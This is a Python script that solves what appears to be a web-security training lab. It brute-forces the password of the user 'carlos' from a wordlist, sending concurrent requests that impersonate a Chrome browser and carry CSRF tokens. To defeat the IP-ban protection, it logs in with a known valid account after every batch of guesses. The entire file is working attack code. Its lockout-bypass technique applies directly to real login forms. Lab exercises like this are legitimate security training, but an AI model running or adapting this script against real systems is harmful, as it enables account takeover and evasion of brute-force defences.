import os
import re
import asyncio
from AutoConcurrencyScaler import AutoConcurrencyScaler
from curl_cffi.requests import AsyncSession
from urllib.parse import urljoin

TIMEOUT = 10

file_user = os.path.join(os.path.abspath(os.path.dirname(__file__)), "username_candidate.txt")
file_pass = os.path.join(os.path.abspath(os.path.dirname(__file__)), "password_candidate.txt")

class BruteForce:
    def __init__(self, username: str, passwords: list[str], valid_user:str, valid_pass:str, login_url:str, batch_size:int):
        self.username = username
        self.passwords = passwords
        self.valid_user = valid_user
        self.valid_pass = valid_pass
        self.pwned_cred = ()
        self.csrf_token = None
        self.reset_lock = asyncio.Lock()
        self.BATCH_SIZE = batch_size
        self.login_url = login_url

    async def _get_csrf_token(self, session: AsyncSession, refresh=False):
        if self.csrf_token and not refresh:
            return self.csrf_token
        try:
            resp = await session.get(login_url)
            match = re.search(r'name=["\']csrf["\']\s+value=["\'](.*?)["\']', resp.text)
            if match:
                self.csrf_token = match.group(1)
                return self.csrf_token
        except:
            pass
        return None

    async def _reset_ip_ban(self, session: AsyncSession):
        async with self.reset_lock:
            payload = {
                'username': self.valid_user,
                'password': self.valid_pass
            }
            csrf_token = await self._get_csrf_token(session, refresh=True)
            if csrf_token: payload['csrf'] = csrf_token
            try:
                resp = await session.post(url=self.login_url, data=payload, timeout=TIMEOUT, allow_redirects=False)
                if resp.status_code != 302:
                    print(f"[!] Warning: Reset login might have failed. Status: {resp.status_code}")
            except Exception as e:
                print (f"[!] Error: {e}")
    
    async def _crack_password(self, session: AsyncSession, username: str, password: str):
        token = await self._get_csrf_token(session)
        payload = {
            'username': username,
            'password': password
        }
        if token: payload['csrf'] = token
        try:
            resp = await session.post(url=self.login_url, data=payload, allow_redirects=False, timeout=TIMEOUT)
            if resp.status_code == 302:
                return (username, password)
        except Exception as e:
            print (f"[!] Error during crack password: {e}")
    async def run(self):
        async with AsyncSession(impersonate="chrome142") as session:
            print ("\n[*] Cracking password for Carlos")
            for i in range(0, len(self.passwords), self.BATCH_SIZE):
                batch_pass = self.passwords[i:i+self.BATCH_SIZE]
                tasks = []
                for pwd in batch_pass:
                    tasks.append(self._crack_password(session, self.username, pwd))
                result = await asyncio.gather(*tasks)
                for res in result:
                    if res:
                        print(f"\n[!!!] PWNED SUCCESSFULLY: {res[0]} :: {res[1]}")
                        return
                
                print(f"\r[Batch {i}] Cracking Carlos...", end='')
                await self._reset_ip_ban(session)

if __name__ == "__main__":
    base_url = input("Enter your lab's url: ")
    login_url = urljoin(base_url, '/login')
    my_account = ('wiener', 'peter')
    passwords = open(file_pass, "r").read().splitlines()
    bot = BruteForce('carlos', passwords, my_account[0], my_account[1], login_url, 2)
    asyncio.run(bot.run())